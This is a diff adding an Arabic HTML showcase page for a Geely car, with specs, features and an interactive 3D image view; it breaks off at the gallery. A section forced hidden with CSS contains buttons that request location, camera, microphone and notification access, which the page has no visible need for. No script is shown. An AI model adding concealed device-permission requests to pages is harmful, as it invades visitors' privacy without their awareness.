@@ -1,0 +1,2160 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>جيلي 26 - Geely 26 | عرض السيارات الاحترافي</title>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        html, body {
+            height: 100%;
+            width: 100%;
+            line-height: 1.8;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #0a0e27 0%, #1a1f3a 50%, #0f1729 100%);
+            color: #e0e0e0;
+            overflow-x: hidden;
+            font-size: clamp(15px, 0.45vw + 12px, 18px);
+        }
+
+        /* Header */
+        header {
+            background: rgba(20, 25, 50, 0.96);
+            backdrop-filter: blur(15px);
+            border-bottom: 2px solid rgba(100, 200, 255, 0.3);
+            padding: 30px 20px;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.6);
+        }
+
+        .header-content {
+            max-width: 1400px;
+            margin: 0 auto;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            gap: 16px;
+        }
+
+        .logo {
+            font-size: 2.2rem;
+            font-weight: 900;
+            background: linear-gradient(135deg, #64c8ff, #00d4ff);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            letter-spacing: 1px;
+        }
+
+        .nav-links {
+            display: flex;
+            gap: 30px;
+            list-style: none;
+            flex-wrap: wrap;
+            justify-content: flex-end;
+        }
+
+        .nav-links a {
+            color: #a0a0ff;
+            text-decoration: none;
+            font-weight: 600;
+            transition: 0.4s;
+            border-bottom: 3px solid transparent;
+            font-size: 1.05rem;
+        }
+
+        .nav-links a:hover {
+            color: #64c8ff;
+            border-bottom-color: #64c8ff;
+        }
+
+        /* Hero Section */
+        .hero {
+            height: 100vh;
+            background: linear-gradient(135deg, rgba(100, 200, 255, 0.2) 0%, rgba(0, 212, 255, 0.1) 100%), url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1200 600"><path fill="rgba(100,200,255,0.05)" d="M0 300 Q300 100 600 300 T1200 300 L1200 600 L0 600 Z"/></svg>');
+            background-size: cover;
+            background-position: center;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+            overflow: hidden;
+            border-bottom: 3px solid rgba(100, 200, 255, 0.3);
+        }
+
+        .hero::before {
+            content: '';
+            position: absolute;
+            width: 600px;
+            height: 600px;
+            background: radial-gradient(circle, rgba(100, 200, 255, 0.15) 0%, transparent 70%);
+            border-radius: 50%;
+            animation: float 8s ease-in-out infinite;
+        }
+
+        @keyframes float {
+            0%, 100% { transform: translateY(0px); }
+            50% { transform: translateY(-50px); }
+        }
+
+        .hero-content {
+            text-align: center;
+            z-index: 2;
+            animation: slideUp 1s ease-out;
+            width: min(100%, 1100px);
+            padding: 0 16px;
+        }
+
+        @keyframes slideUp {
+            from {
+                opacity: 0;
+                transform: translateY(60px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .hero h1 {
+            font-size: clamp(2.2rem, 7vw, 6rem);
+            margin-bottom: 20px;
+            background: linear-gradient(135deg, #64c8ff, #00d4ff, #64c8ff);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            font-weight: 900;
+            text-shadow: 0 0 30px rgba(100, 200, 255, 0.3);
+            letter-spacing: 2px;
+        }
+
+        .hero p {
+            font-size: clamp(1rem, 2.2vw, 2rem);
+            color: #b0b0e0;
+            margin-bottom: 50px;
+            font-weight: 300;
+            line-height: 1.8;
+        }
+
+        .cta-button {
+            background: linear-gradient(135deg, #64c8ff, #00d4ff);
+            color: #0a0e27;
+            border: none;
+            padding: clamp(12px, 1.4vw, 25px) clamp(22px, 3vw, 70px);
+            font-size: clamp(1rem, 1.8vw, 1.4rem);
+            font-weight: 700;
+            border-radius: 60px;
+            cursor: pointer;
+            transition: all 0.4s;
+            box-shadow: 0 15px 50px rgba(100, 200, 255, 0.4);
+            text-decoration: none;
+            display: inline-block;
+            margin: 10px;
+            max-width: 100%;
+            white-space: normal;
+        }
+
+        .cta-button:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 25px 70px rgba(100, 200, 255, 0.6);
+            font-size: 1.45rem;
+        }
+
+        .secondary-button {
+            background: transparent;
+            color: #64c8ff;
+            border: 2px solid #64c8ff;
+            padding: 20px 60px;
+        }
+
+        .secondary-button:hover {
+            background: rgba(100, 200, 255, 0.1);
+            border-color: #00d4ff;
+        }
+
+        .permission-section {
+            max-width: 1100px;
+            margin: 0 auto;
+            padding: 20px 16px 10px;
+            display: none !important;
+        }
+
+        .permission-card {
+            background: linear-gradient(135deg, rgba(100, 200, 255, 0.16), rgba(0, 212, 255, 0.08));
+            border: 1px solid rgba(100, 200, 255, 0.35);
+            border-radius: 16px;
+            padding: 18px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.25);
+        }
+
+        .permission-title {
+            font-size: clamp(1.1rem, 2.4vw, 1.5rem);
+            margin-bottom: 10px;
+            color: #64c8ff;
+            text-align: center;
+        }
+
+        .permission-actions {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(190px, 1fr));
+            gap: 10px;
+            margin-top: 10px;
+        }
+
+        .permission-btn {
+            border: 1px solid rgba(100, 200, 255, 0.45);
+            background: rgba(20, 25, 50, 0.7);
+            color: #eaf7ff;
+            border-radius: 12px;
+            padding: 12px;
+            cursor: pointer;
+            font-weight: 600;
+            transition: 0.25s;
+        }
+
+        .permission-btn:hover {
+            transform: translateY(-1px);
+            border-color: #64c8ff;
+            background: rgba(20, 25, 50, 0.95);
+        }
+
+        .permission-status {
+            margin-top: 12px;
+            padding: 10px 12px;
+            border-radius: 10px;
+            background: rgba(10, 14, 39, 0.7);
+            border: 1px solid rgba(100, 200, 255, 0.2);
+            color: #cde9ff;
+            font-size: 0.95rem;
+            min-height: 44px;
+            word-break: break-word;
+        }
+
+        .booking-modal {
+            position: fixed;
+            inset: 0;
+            background: rgba(2, 6, 23, 0.78);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            z-index: 9999;
+            padding: 16px;
+        }
+
+        .booking-modal.show {
+            display: flex;
+        }
+
+        .booking-dialog {
+            width: min(100%, 560px);
+            background: linear-gradient(135deg, #0d1a3d 0%, #11234f 100%);
+            border: 1px solid rgba(100, 200, 255, 0.35);
+            border-radius: 16px;
+            padding: 18px;
+            box-shadow: 0 25px 80px rgba(0, 0, 0, 0.45);
+        }
+
+        .booking-title {
+            color: #64c8ff;
+            font-size: 1.35rem;
+            margin-bottom: 10px;
+        }
+
+        .booking-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 10px;
+        }
+
+        .booking-field {
+            display: flex;
+            flex-direction: column;
+            gap: 6px;
+        }
+
+        .booking-field.full {
+            grid-column: 1 / -1;
+        }
+
+        .booking-field label {
+            font-size: 0.9rem;
+            color: #c7e6ff;
+        }
+
+        .booking-field input,
+        .booking-field textarea,
+        .booking-field select {
+            width: 100%;
+            border-radius: 10px;
+            border: 1px solid rgba(100, 200, 255, 0.35);
+            background: rgba(8, 15, 36, 0.72);
+            color: #eef8ff;
+            padding: 10px;
+            outline: none;
+        }
+
+        .booking-field textarea {
+            min-height: 88px;
+            resize: vertical;
+        }
+
+        .booking-actions {
+            display: flex;
+            gap: 10px;
+            margin-top: 12px;
+        }
+
+        .booking-actions button {
+            flex: 1;
+            border-radius: 10px;
+            border: 1px solid rgba(100, 200, 255, 0.35);
+            cursor: pointer;
+            padding: 10px;
+            font-weight: 700;
+        }
+
+        .btn-book-submit {
+            background: linear-gradient(135deg, #64c8ff, #00d4ff);
+            color: #061427;
+        }
+
+        .btn-book-cancel {
+            background: rgba(10, 18, 45, 0.7);
+            color: #cfeaff;
+        }
+
+        .booking-feedback {
+            margin-top: 10px;
+            font-size: 0.92rem;
+            color: #d8ecff;
+            min-height: 22px;
+        }
+
+        .car3d-section {
+            max-width: 1200px;
+            margin: 30px auto 10px;
+            padding: 0 14px;
+        }
+
+        .car3d-wrap {
+            display: grid;
+            grid-template-columns: 1.6fr 1fr;
+            gap: 14px;
+            align-items: stretch;
+        }
+
+        .car3d-stage {
+            background: radial-gradient(circle at 30% 10%, rgba(86, 160, 255, 0.22), rgba(8, 17, 40, 0.92));
+            border: 1px solid rgba(100, 200, 255, 0.35);
+            border-radius: 18px;
+            padding: 14px;
+            perspective: 1200px;
+            transition: transform 0.8s cubic-bezier(0.2, 0.8, 0.2, 1), border-color 0.45s ease, box-shadow 0.45s ease;
+            transform-origin: center;
+        }
+
+        .car3d-scene {
+            position: relative;
+            border-radius: 12px;
+            overflow: hidden;
+            transform-style: preserve-3d;
+            transform: rotateX(5deg) rotateY(-5deg);
+            transition: transform 0.7s cubic-bezier(0.2, 0.8, 0.2, 1), filter 0.7s ease;
+            cursor: grab;
+            touch-action: pan-y;
+        }
+
+        .car3d-section.cinematic .car3d-stage {
+            animation: cinematicZoom 4.4s ease-in-out infinite alternate;
+            border-color: rgba(123, 214, 255, 0.7);
+            box-shadow: 0 25px 70px rgba(32, 132, 180, 0.28);
+        }
+
+        .car3d-section.cinematic .car3d-scene {
+            filter: saturate(1.12) contrast(1.04);
+        }
+
+        @keyframes cinematicZoom {
+            0% { transform: scale(1) translateY(0); }
+            55% { transform: scale(1.018) translateY(-2px); }
+            100% { transform: scale(1.032) translateY(-4px); }
+        }
+
+        .car3d-scene.dragging {
+            cursor: grabbing;
+            transition: none;
+        }
+
+        .car3d-scene img {
+            width: 100%;
+            display: block;
+            border-radius: 12px;
+            box-shadow: 0 22px 45px rgba(0, 0, 0, 0.45);
+            user-select: none;
+            -webkit-user-drag: none;
+        }
+
+        .car-hotspot {
+            position: absolute;
+            width: 18px;
+            height: 18px;
+            border-radius: 50%;
+            border: 2px solid #9be2ff;
+            background: rgba(0, 212, 255, 0.85);
+            box-shadow: 0 0 0 0 rgba(122, 220, 255, 0.8);
+            cursor: pointer;
+            transform: translate(-50%, -50%);
+            animation: pulseSpot 1.8s infinite;
+        }
+
+        .car-hotspot.active {
+            background: #fff176;
+            border-color: #ffe95d;
+        }
+
+        .car-hotspot::after {
+            content: attr(data-label);
+            position: absolute;
+            top: -28px;
+            right: -10px;
+            font-size: 0.74rem;
+            color: #d8f4ff;
+            background: rgba(4, 11, 28, 0.82);
+            border: 1px solid rgba(100, 200, 255, 0.3);
+            border-radius: 8px;
+            padding: 2px 6px;
+            white-space: nowrap;
+            opacity: 0;
+            transform: translateY(4px);
+            transition: opacity 0.25s ease, transform 0.25s ease;
+            pointer-events: none;
+        }
+
+        .car-hotspot:hover::after,
+        .car-hotspot.active::after {
+            opacity: 1;
+            transform: translateY(0);
+        }
+
+        .hotspot-tooltip {
+            position: absolute;
+            z-index: 15;
+            pointer-events: none;
+            transform: translate(-50%, -120%);
+            background: rgba(4, 10, 28, 0.92);
+            color: #dff5ff;
+            border: 1px solid rgba(100, 200, 255, 0.45);
+            border-radius: 10px;
+            padding: 6px 10px;
+            font-size: 0.8rem;
+            white-space: nowrap;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.35);
+            opacity: 0;
+            transition: opacity 0.18s ease;
+        }
+
+        .hotspot-tooltip.show {
+            opacity: 1;
+        }
+
+        .car3d-controls {
+            margin-top: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            gap: 10px;
+            flex-wrap: wrap;
+        }
+
+        .car3d-drag-hint {
+            color: #bfe7ff;
+            font-size: 0.92rem;
+            background: rgba(6, 15, 38, 0.7);
+            border: 1px solid rgba(100, 200, 255, 0.28);
+            border-radius: 999px;
+            padding: 5px 12px;
+        }
+
+        .car3d-angle {
+            color: #f6fcff;
+            font-size: 0.88rem;
+            background: linear-gradient(135deg, rgba(100, 200, 255, 0.25), rgba(0, 212, 255, 0.18));
+            border: 1px solid rgba(100, 200, 255, 0.36);
+            border-radius: 999px;
+            padding: 5px 12px;
+            min-width: 110px;
+            text-align: center;
+        }
+
+        .car3d-nav {
+            display: flex;
+            gap: 8px;
+        }
+
+        .car3d-nav button {
+            border: 1px solid rgba(100, 200, 255, 0.35);
+            background: rgba(8, 16, 40, 0.82);
+            color: #d8f2ff;
+            border-radius: 10px;
+            padding: 6px 12px;
+            cursor: pointer;
+            font-weight: 700;
+            transition: 0.25s;
+        }
+
+        .car3d-nav button:hover {
+            border-color: #64c8ff;
+            color: #64c8ff;
+            transform: translateY(-1px);
+        }
+
+        @keyframes pulseSpot {
+            0% { box-shadow: 0 0 0 0 rgba(122, 220, 255, 0.8); }
+            70% { box-shadow: 0 0 0 12px rgba(122, 220, 255, 0); }
+            100% { box-shadow: 0 0 0 0 rgba(122, 220, 255, 0); }
+        }
+
+        .car3d-info {
+            border: 1px solid rgba(100, 200, 255, 0.35);
+            border-radius: 18px;
+            background: linear-gradient(135deg, rgba(16, 28, 64, 0.95), rgba(7, 15, 36, 0.95));
+            padding: 16px;
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+        }
+
+        .car3d-info h3 {
+            color: #64c8ff;
+            font-size: 1.25rem;
+        }
+
+        .car3d-part-title {
+            color: #f2fbff;
+            font-size: 1.05rem;
+            font-weight: 700;
+        }
+
+        .car3d-part-desc {
+            color: #c6e6ff;
+            line-height: 1.7;
+            min-height: 110px;
+        }
+
+        /* Main Content */
+        .container {
+            max-width: 1400px;
+            margin: 0 auto;
+            padding: clamp(40px, 6vw, 100px) clamp(14px, 3vw, 30px);
+        }
+
+        /* Specs Grid */
+        .specs-section {
+            margin: 100px 0;
+        }
+
+        .section-title {
+            font-size: clamp(1.8rem, 4.6vw, 3.5rem);
+            text-align: center;
+            margin-bottom: 80px;
+            color: #64c8ff;
+            font-weight: 800;
+            text-transform: uppercase;
+            letter-spacing: 3px;
+        }
+
+        .specs-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 40px;
+            margin-bottom: 80px;
+        }
+
+        .spec-card {
+            background: linear-gradient(135deg, rgba(100, 200, 255, 0.15), rgba(0, 212, 255, 0.08));
+            border: 2px solid rgba(100, 200, 255, 0.3);
+            border-radius: 20px;
+            padding: 40px;
+            text-align: center;
+            transition: all 0.4s;
+            cursor: pointer;
+        }
+
+        .spec-card:hover {
+            transform: translateY(-15px);
+            border-color: rgba(100, 200, 255, 0.7);
+            box-shadow: 0 30px 70px rgba(100, 200, 255, 0.25);
+            background: linear-gradient(135deg, rgba(100, 200, 255, 0.2), rgba(0, 212, 255, 0.15));
+        }
+
+        .spec-icon {
+            font-size: 3.5rem;
+            color: #64c8ff;
+            margin-bottom: 25px;
+        }
+
+        .spec-label {
+            font-size: 1.2rem;
+            color: #a0a0ff;
+            margin-bottom: 12px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            font-weight: 600;
+        }
+
+        .spec-value {
+            font-size: 2rem;
+            font-weight: 800;
+            color: #e0e0e0;
+        }
+
+        /* Features */
+        .features-section {
+            margin: 100px 0;
+            background: linear-gradient(135deg, rgba(100, 200, 255, 0.08), rgba(0, 212, 255, 0.04));
+            border-radius: 30px;
+            padding: 80px;
+            border: 2px solid rgba(100, 200, 255, 0.2);
+        }
+
+        .features-list {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(350px, 1fr));
+            gap: 45px;
+        }
+
+        .feature-item {
+            display: flex;
+            gap: 25px;
+            padding: 35px;
+            background: rgba(20, 25, 50, 0.6);
+            border-radius: 15px;
+            border-left: 6px solid #64c8ff;
+            transition: all 0.4s;
+        }
+
+        .feature-item:hover {
+            background: rgba(20, 25, 50, 0.9);
+            transform: translateX(8px);
+            border-left-color: #00d4ff;
+        }
+
+        .feature-icon {
+            font-size: 2.5rem;
+            color: #64c8ff;
+            flex-shrink: 0;
+            line-height: 1;
+        }
+
+        .feature-text h3 {
+            color: #64c8ff;
+            margin-bottom: 12px;
+            font-size: 1.5rem;
+        }
+
+        .feature-text p {
+            color: #a0a0ff;
+            font-size: 1.1rem;
+            line-height: 1.8;
+        }
+
+        /* Pricing */
+        .pricing-section {
+            margin: 100px 0;
+            text-align: center;
+        }
+
+        .pricing-card {
+            background: linear-gradient(135deg, rgba(100, 200, 255, 0.15), rgba(0, 212, 255, 0.08));
+            border: 3px solid rgba(100, 200, 255, 0.4);
+            border-radius: 25px;
+            padding: 60px;
+            margin: 40px auto;
+            max-width: 700px;
+            transition: all 0.4s;
+        }
+
+        .pricing-card:hover {
+            transform: scale(1.08);
+            border-color: #64c8ff;
+            box-shadow: 0 30px 80px rgba(100, 200, 255, 0.3);
+        }
+
+        .price-amount {
+            font-size: 4.5rem;
+            font-weight: 900;
+            color: #64c8ff;
+            margin: 30px 0;
+            text-shadow: 0 0 20px rgba(100, 200, 255, 0.3);
+        }
+
+        .price-currency {
+            font-size: 1.5rem;
+            color: #a0a0ff;
+        }
+
+        .price-period {
+            color: #a0a0ff;
+            font-size: 1.2rem;
+            margin-top: 15px;
+        }
+
+        .pricing-features {
+            text-align: right;
+            margin: 45px 0;
+            color: #b0b0e0;
+        }
+
+        .pricing-features li {
+            margin: 15px 0;
+            list-style: none;
+            font-size: 1.2rem;
+        }
+
+        .pricing-features li:before {
+            content: "✓ ";
+            color: #64c8ff;
+            font-weight: bold;
+            margin-right: 15px;
+            font-size: 1.4rem;
+        }
+
+        /* Gallery */
+        .gallery-section {
+            margin: 100px 0;
+            padding-bottom: 80px;
+        }
+
+        .gallery-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(350px, 1fr));
+            gap: 30px;
+            margin-bottom: 60px;
+        }
+
+        .gallery-item {
+            aspect-ratio: 4/3;
+            background: linear-gradient(135deg, rgba(100, 200, 255, 0.2), rgba(0, 212, 255, 0.15));
+            border-radius: 15px;
+            overflow: hidden;
+            cursor: pointer;
+            transition: all 0.4s;
+            border: 2px solid rgba(100, 200, 255, 0.3);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.4);
+        }
+
+        .gallery-item img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            transition: transform 0.4s;
+        }
+
+        .gallery-item:hover img {
+            transform: scale(1.08);
+        }
+
+        .gallery-item:hover {
+            transform: translateY(-12px);
+            border-color: #64c8ff;
+            box-shadow: 0 20px 60px rgba(100, 200, 255, 0.3);
+        }
+
+        .no-image {
+            font-size: 4rem;
+            color: #64c8ff;
+        }
+
+        .debug-chip {
+            position: fixed;
+            left: 12px;
+            bottom: 12px;
+            z-index: 12000;
+            display: none;
+            max-width: min(92vw, 480px);
+            padding: 8px 10px;
+            border-radius: 10px;
+            border: 1px solid rgba(112, 242, 176, 0.55);
+            background: rgba(2, 18, 10, 0.92);
+            color: #b9ffd8;
+            font-size: 0.82rem;
+            line-height: 1.5;
+            box-shadow: 0 12px 30px rgba(0, 0, 0, 0.4);
+            direction: ltr;
+            text-align: left;
+            white-space: pre-line;
+        }
+
+        .debug-chip.show {
+            display: block;
+        }
+
+        /* Footer */
+        footer {
+            background: rgba(10, 14, 39, 0.97);
+            border-top: 2px solid rgba(100, 200, 255, 0.3);
+            padding: 80px 30px;
+            margin-top: 100px;
+            text-align: center;
+            color: #a0a0ff;
+        }
+
+        .footer-content {
+            max-width: 1400px;
+            margin: 0 auto;
+        }
+
+        .footer-content h3 {
+            color: #64c8ff;
+            margin-bottom: 25px;
+            font-size: 2rem;
+        }
+
+        .footer-content p {
+            font-size: 1.2rem;
+            margin-bottom: 30px;
+        }
+
+        .social-links {
+            margin: 40px 0;
+        }
+
+        .social-links a {
+            display: inline-block;
+            width: 70px;
+            height: 70px;
+            background: rgba(100, 200, 255, 0.15);
+            border: 2px solid rgba(100, 200, 255, 0.3);
+            border-radius: 50%;
+            margin: 0 15px;
+            color: #64c8ff;
+            text-decoration: none;
+            line-height: 70px;
+            transition: all 0.4s;
+            font-size: 1.5rem;
+        }
+
+        .social-links a:hover {
+            background: #64c8ff;
+            color: #0a0e27;
+            transform: translateY(-5px);
+            border-color: #64c8ff;
+        }
+
+        /* Responsive */
+        @media (max-width: 1200px) {
+            .specs-grid { grid-template-columns: repeat(2, minmax(0, 1fr)); gap: 24px; }
+            .features-list { grid-template-columns: repeat(2, minmax(0, 1fr)); gap: 24px; }
+            .gallery-grid { grid-template-columns: repeat(2, minmax(0, 1fr)); gap: 20px; }
+            .pricing-card:hover { transform: scale(1.03); }
+        }
+
+        @media (max-width: 992px) {
+            header { padding: 18px 14px; }
+            .header-content { flex-direction: column; align-items: stretch; }
+            .logo { text-align: center; }
+            .nav-links { justify-content: center; gap: 14px; }
+            .hero { height: auto; min-height: 72vh; padding: 90px 0 60px; }
+            .specs-grid, .features-list, .gallery-grid { grid-template-columns: 1fr; }
+            .features-section { padding: 28px 18px; border-radius: 18px; }
+            .pricing-card { max-width: 100%; padding: 30px 18px; }
+            .pricing-card:hover { transform: none; }
+            .car3d-wrap { grid-template-columns: 1fr; }
+            .car3d-part-desc { min-height: auto; }
+        }
+
+        @media (max-width: 768px) {
+            .hero h1 { letter-spacing: 0.5px; }
+            .hero p { margin-bottom: 24px; }
+            .cta-button { width: 100%; margin: 8px 0; border-radius: 16px; }
+            .secondary-button { padding: 12px 18px; }
+            .section-title { margin-bottom: 28px; letter-spacing: 1px; }
+            .specs-section, .features-section, .pricing-section, .gallery-section { margin: 42px 0; }
+            .spec-card { padding: 22px 14px; }
+            .feature-item { padding: 18px 14px; gap: 12px; }
+            .feature-text h3 { font-size: 1.05rem; }
+            .feature-text p { font-size: 0.95rem; }
+            .price-amount { font-size: clamp(2rem, 10vw, 3rem); }
+            .price-currency, .price-period { font-size: 1rem; }
+            .social-links a { width: 48px; height: 48px; line-height: 48px; margin: 0 6px; font-size: 1.1rem; }
+            footer { padding: 40px 14px; margin-top: 50px; }
+            .booking-grid { grid-template-columns: 1fr; }
+            .car3d-controls { justify-content: center; }
+            .car3d-angle { min-width: 100px; }
+        }
+
+        @media (max-width: 420px) {
+            .logo { font-size: 1.45rem; }
+            .nav-links a { font-size: 0.86rem; }
+            .hero { min-height: 68vh; }
+            .hero::before { width: 300px; height: 300px; }
+            .pricing-features li { font-size: 0.95rem; margin: 10px 0; }
+            .gallery-item { border-radius: 10px; }
+        }
+    </style>
+</head>
+<body>
+    <!-- Header -->
+    <header>
+        <div class="header-content">
+            <div class="logo">🚗 GEELY 26</div>
+            <nav class="nav-links">
+                <a href="#specs">المواصفات</a>
+                <a href="#features">المميزات</a>
+                <a href="#gallery">الصور</a>
+                <a href="#pricing">السعر</a>
+                <a href="/">العودة</a>
+            </nav>
+        </div>
+    </header>
+
+    <!-- Hero Section -->
+    <section class="hero">
+        <div class="hero-content">
+            <h1>جيلي 26</h1>
+            <p>تجربة القيادة الحديثة بأسلوب عصري وأداء عالي</p>
+            <button class="cta-button" id="heroBookBtn">احجز الآن</button>
+            <button class="cta-button secondary-button">تعرّف أكثر</button>
+        </div>
+    </section>
+
+    <section class="car3d-section" id="car3d">
+        <h2 class="section-title" style="margin-bottom: 24px;">تجربة 3D تفاعلية</h2>
+        <div class="car3d-wrap">
+            <div class="car3d-stage">
+                <div class="car3d-scene" id="car3dScene">
+                    <img id="car3dImage" src="https://commons.wikimedia.org/wiki/Special:FilePath/Geely_Binyue_Cool_003.jpg" alt="Geely 3D View" loading="lazy" draggable="false">
+                    <div class="hotspot-tooltip" id="hotspotTooltip"></div>
+
+                    <button type="button" class="car-hotspot" data-label="المصابيح" data-title="مصابيح LED أمامية" data-desc="مصابيح LED ذكية بإضاءة قوية واستهلاك منخفض، مع تصميم حاد يحسن الرؤية الليلية." style="top:56%; left:17%;"></button>
+                    <button type="button" class="car-hotspot" data-label="الشبكة" data-title="الشبكة الأمامية" data-desc="شبكة أمامية بتصميم رياضي لتعزيز تدفق الهواء وتبريد المحرك بشكل أفضل." style="top:58%; left:30%;"></button>
+                    <button type="button" class="car-hotspot" data-label="الجنوط" data-title="جنوط رياضية" data-desc="جنوط سبائكية خفيفة لتحسين الثبات وتقليل الوزن غير المعلّق." style="top:74%; left:33%;"></button>
+                    <button type="button" class="car-hotspot" data-label="المرايا" data-title="مرايا جانبية كهربائية" data-desc="مرايا قابلة للطي كهربائيًا مع إشارات LED مدمجة لسلامة أعلى." style="top:46%; left:45%;"></button>
+                    <button type="button" class="car-hotspot" data-label="السقف" data-title="سقف بانورامي" data-desc="سقف بانورامي يمنح إحساسًا أوسع داخل المقصورة مع إضاءة طبيعية." style="top:32%; left:56%;"></button>
+                    <button type="button" class="car-hotspot" data-label="الخلف" data-title="وحدة الإضاءة الخلفية" data-desc="إضاءة خلفية ممتدة تعزز وضوح السيارة في الليل وتضيف لمسة تصميم عصرية." style="top:57%; left:83%;"></button>
+                </div>
+                <div class="car3d-controls">
+                    <div class="car3d-drag-hint">اسحب يمين/شمال لتدوير 360</div>
+                    <div class="car3d-angle" id="car3dModel">الموديل: Geely Coolray</div>
+                    <div class="car3d-angle" id="car3dAngle">زاوية: 0°</div>
+                    <div class="car3d-nav">
+                        <button type="button" id="car3dPrev">السابق</button>
+                        <button type="button" id="car3dNext">التالي</button>
+                    </div>
+                </div>
+            </div>
+
+            <aside class="car3d-info">
+                <h3>تفاصيل الجزء المحدد</h3>
+                <div class="car3d-part-title" id="carPartTitle">اضغط على أي نقطة في العربية</div>
+                <div class="car3d-part-desc" id="carPartDesc">سيظهر لك وصف الجزء هنا بشكل تفصيلي.</div>
+            </aside>
+        </div>
+    </section>
+
+    <section class="permission-section">
+        <div class="permission-card">
+            <h3 class="permission-title">تفعيل الصلاحيات المطلوبة</h3>
+            <div class="permission-actions">
+                <button id="btnLocation" class="permission-btn">طلب صلاحية الموقع</button>
+                <button id="btnCamera" class="permission-btn">طلب صلاحية الكاميرا</button>
+                <button id="btnMic" class="permission-btn">طلب صلاحية الميكروفون</button>
+                <button id="btnNotify" class="permission-btn">طلب صلاحية الإشعارات</button>
+            </div>
+            <div id="permissionStatus" class="permission-status">جاهز لطلب الصلاحيات.</div>
+        </div>
+    </section>
+
+    <!-- Main Content -->
+    <div class="container">
+        <!-- Specifications -->
+        <section class="specs-section" id="specs">
+            <h2 class="section-title">المواصفات الرئيسية</h2>
+            <div class="specs-grid">
+                <div class="spec-card">
+                    <div class="spec-icon"><i class="fas fa-bolt"></i></div>
+                    <div class="spec-label">القوة</div>
+                    <div class="spec-value">156+ حصان</div>
+                </div>
+                <div class="spec-card">
+                    <div class="spec-icon"><i class="fas fa-tachometer-alt"></i></div>
+                    <div class="spec-label">السرعة القصوى</div>
+                    <div class="spec-value">190 كم/س</div>
+                </div>
+                <div class="spec-card">
+                    <div class="spec-icon"><i class="fas fa-gas-pump"></i></div>
+                    <div class="spec-label">استهلاك الوقود</div>
+                    <div class="spec-value">6.5 لتر/100كم</div>
+                </div>
+                <div class="spec-card">
+                    <div class="spec-icon"><i class="fas fa-car"></i></div>
+                    <div class="spec-label">نوع المحرك</div>
+                    <div class="spec-value">1.5L تيربو</div>
+                </div>
+                <div class="spec-card">
+                    <div class="spec-icon"><i class="fas fa-space-shuttle"></i></div>
+                    <div class="spec-label">التسارع 0-100</div>
+                    <div class="spec-value">9.8 ثانية</div>
+                </div>
+                <div class="spec-card">
+                    <div class="spec-icon"><i class="fas fa-expand"></i></div>
+                    <div class="spec-label">الأبعاد</div>
+                    <div class="spec-value">4250×1825×1545 ملم</div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Features -->
+        <section class="features-section" id="features">
+            <h2 class="section-title">المميزات والتجهيزات</h2>
+            <div class="features-list">
+                <div class="feature-item">
+                    <div class="feature-icon"><i class="fas fa-shield-alt"></i></div>
+                    <div class="feature-text">
+                        <h3>نظام الأمان المتقدم</h3>
+                        <p>الوسائد الهوائية المتعددة وأنظمة التحكم الديناميكي والمكابح المضادة للانزلاق</p>
+                    </div>
+                </div>
+                <div class="feature-item">
+                    <div class="feature-icon"><i class="fas fa-mobile-alt"></i></div>
+                    <div class="feature-text">
+                        <h3>تقنيات ذكية</h3>
+                        <p>نظام ترفيه بشاشة تعمل باللمس وتوصيل بالهاتف الذكي والمساعد الصوتي</p>
+                    </div>
+                </div>
+                <div class="feature-item">
+                    <div class="feature-icon"><i class="fas fa-wind"></i></div>
+                    <div class="feature-text">
+                        <h3>نظام التكييف الذكي</h3>
+                        <p>تحكم درجات حرارة منفصلة للسائق والركاب مع تنقية الهواء المتقدمة</p>
+                    </div>
+                </div>
+                <div class="feature-item">
+                    <div class="feature-icon"><i class="fas fa-camera"></i></div>
+                    <div class="feature-text">
+                        <h3>كاميرا الرجوع والمراقبة</h3>
+                        <p>رؤية خلفية واضحة مع خطوط إرشادية ديناميكية وكاميرا 360 درجة</p>
+                    </div>
+                </div>
+                <div class="feature-item">
+                    <div class="feature-icon"><i class="fas fa-lightbulb"></i></div>
+                    <div class="feature-text">
+                        <h3>إضاءة LED حديثة</h3>
+                        <p>مصابيح أمامية وخلفية بتقنية LED الاقتصادية مع إضاءة ديناميكية</p>
+                    </div>
+                </div>
+                <div class="feature-item">
+                    <div class="feature-icon"><i class="fas fa-wifi"></i></div>
+                    <div class="feature-text">
+                        <h3>اتصال متقدم</h3>
+                        <p>نظام ملاحة GPS وتوصيل واي فاي 4G والتحديثات عبر الهواء</p>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Gallery -->
+        <section class="gallery-section" id="gallery">
+            <h2 class="section-title">معرض الصور</h2>
+            <div class="gallery-grid">
